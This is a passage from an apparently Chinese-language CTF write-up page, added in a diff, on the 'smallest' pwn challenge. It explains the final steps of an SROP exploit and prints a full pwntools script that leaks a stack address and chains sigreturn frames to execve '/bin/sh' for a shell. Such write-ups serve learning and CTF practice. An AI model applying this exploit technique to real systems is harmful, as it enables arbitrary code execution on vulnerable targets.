+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">start_addr</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">sigframe</span><span class="p">)</span> <span class="c1"># start_addr改写自己返回地址</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</code></pre></div>
+<h4 id="step-4">step 4<a class="headerlink" href="#step-4" title="Permanent link">&para;</a></h4>
+<p>syscall_ret 填充 'a'*8 ，\x00 填充 rt_sigreturn  。用 syscall_ret 主动恢复内存状态，就不需要用到 re_sigreturn 被动调用恢复内存状态。（这点是我根据其他类似题目 wp 中 str(sigframe[8:]) ，signal 栈帧前面是主动的 syscall(15) 调用  rt_signreturn ，就不需要 signal 栈帧中的 rt_signreturn 被动调用）</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># ==step4==</span>
+<span class="c1">## set rax=15 and call sigreturn、</span>
+<span class="n">sigreturn</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">7</span>   <span class="c1"># 覆盖rt_sigreturn;填充15字节</span>
+                                            <span class="c1"># 修改返回地址到syscall ret</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">sigreturn</span><span class="p">)</span>
+</code></pre></div>
+<h4 id="step-5">step 5<a class="headerlink" href="#step-5" title="Permanent link">&para;</a></h4>
+<p>和 step 3 一样写入 signal 栈帧，这里写入的是 execve 的。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># ==step5==</span>
+<span class="c1">## call execv(&quot;/bin/sh&quot;,0,0)</span>
+<span class="n">sigframe</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_execve</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">stack_addr</span> <span class="o">+</span> <span class="mh">0x120</span>  <span class="c1"># &quot;/bin/sh&quot; &#39;s addr</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mh">0x0</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mh">0x0</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">stack_addr</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall_ret</span>
+
+<span class="n">frame_payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">start_addr</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">sigframe</span><span class="p">)</span>    <span class="c1">#start_addr 改写自己返回地址</span>
+<span class="nb">print</span> <span class="nb">len</span><span class="p">(</span><span class="n">frame_payload</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">frame_payload</span> <span class="o">+</span> <span class="p">(</span><span class="mh">0x120</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">frame_payload</span><span class="p">))</span> <span class="o">*</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</code></pre></div>
+<h4 id="step-6">step 6<a class="headerlink" href="#step-6" title="Permanent link">&para;</a></h4>
+<p>与 step 4 一样主动调用 rt_sigreturn 恢复内存状态。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># ==step6==</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">sigreturn</span><span class="p">)</span>   <span class="c1"># 调用syscall</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h3 id="exp">EXP<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
+<span class="c1"># -*- coding: utf-8 -*-</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./smallest&#39;</span><span class="p">)</span>
+<span class="n">small</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./smallest&#39;</span><span class="p">)</span>
+
+
+<span class="n">syscall_ret</span> <span class="o">=</span> <span class="mh">0x00000000004000BE</span>
+<span class="n">start_addr</span> <span class="o">=</span> <span class="mh">0x00000000004000B0</span>
+
+<span class="c1"># ==step0==</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">start_addr</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>   <span class="c1">#step012</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="c1">#第一个start_addr</span>
+
+<span class="c1"># ==step1==</span>
+<span class="c1">## modify the return addr to start_addr+3</span>
+<span class="c1">## so that skip the xor rax,rax; then the rax=1</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xb3</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># 第二个start_addr</span>
+                <span class="c1"># 写入一个字节，让rax变成1，也就是系统调用号1 write</span>
+                <span class="c1"># 同时这个是覆盖写入第二个start_addr最低字节，直接控制跳转0x4000B3保存rax的值</span>
+<span class="c1"># ==step2==</span>
+<span class="n">stack_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()[</span><span class="mi">8</span><span class="p">:</span><span class="mi">16</span><span class="p">])</span>    <span class="c1"># 接受rsp下一个内存块中的栈地址</span>
+                                    <span class="c1"># 第三个start_addr</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;leak stack addr :&#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">))</span>
+
+<span class="c1"># ==step3==</span>
+<span class="c1">## make the rsp point to stack_addr</span>
+<span class="c1">## the frame is read(0,stack_addr,0x400)</span>
+<span class="n">sigframe</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_read</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="n">stack_addr</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mh">0x400</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">stack_addr</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall_ret</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">start_addr</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">sigframe</span><span class="p">)</span> <span class="c1">#start_addr 改写自己返回地址</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># ==step4==</span>
+<span class="c1">## set rax=15 and call sigreturn、</span>
+<span class="n">sigreturn</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">7</span>   <span class="c1"># 覆盖rt_sigreturn;填充15字节</span>
+                                            <span class="c1"># 修改返回地址到syscall ret</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">sigreturn</span><span class="p">)</span>
+
+<span class="c1"># ==step5==</span>
+<span class="c1">## call execv(&quot;/bin/sh&quot;,0,0)</span>
+<span class="n">sigframe</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_execve</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">stack_addr</span> <span class="o">+</span> <span class="mh">0x120</span>  <span class="c1"># &quot;/bin/sh&quot; &#39;s addr</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mh">0x0</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mh">0x0</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">stack_addr</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall_ret</span>
+
+<span class="n">frame_payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">start_addr</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">sigframe</span><span class="p">)</span>    <span class="c1">#start_addr 改写自己返回地址</span>
+<span class="nb">print</span> <span class="nb">len</span><span class="p">(</span><span class="n">frame_payload</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">frame_payload</span> <span class="o">+</span> <span class="p">(</span><span class="mh">0x120</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">frame_payload</span><span class="p">))</span> <span class="o">*</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="c1">## ==step6==</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">sigreturn</span><span class="p">)</span>   <span class="c1"># 调用syscall</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h3 id="_3">参考文章<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<ul>
+<li><a href="https://blog.csdn.net/qq_29343201/article/details/72627439">2017 429 ichunqiu ctf smallest(pwn300) writeup</a></li>
+<li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#_11">ctf-wiki</a></li>
+</ul>
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            <span>&copy; 2021</span>by <a href="https://www.mrskye.cn/" target="_blank">SkYe231</a> &nbsp;|&nbsp; <span><a href="http://beian.miit.gov.cn/" target="_blank">粤ICP备20056619号</a></span>
+          </div>
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../../../../assets/javascripts/vendor.93c04032.min.js"></script>
+      <script src="../../../../../assets/javascripts/bundle.83e5331e.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
+      
+      <script>
+        app = initialize({
+          base: "../../../../..",
+          features: ['tabs', 'instant'],
+          search: Object.assign({
+            worker: "../../../../../assets/javascripts/worker/search.8c7e0a7e.min.js"
+          }, typeof search !== "undefined" && search)
+        })
+      </script>
+      
+    
+  </body>
+</html>
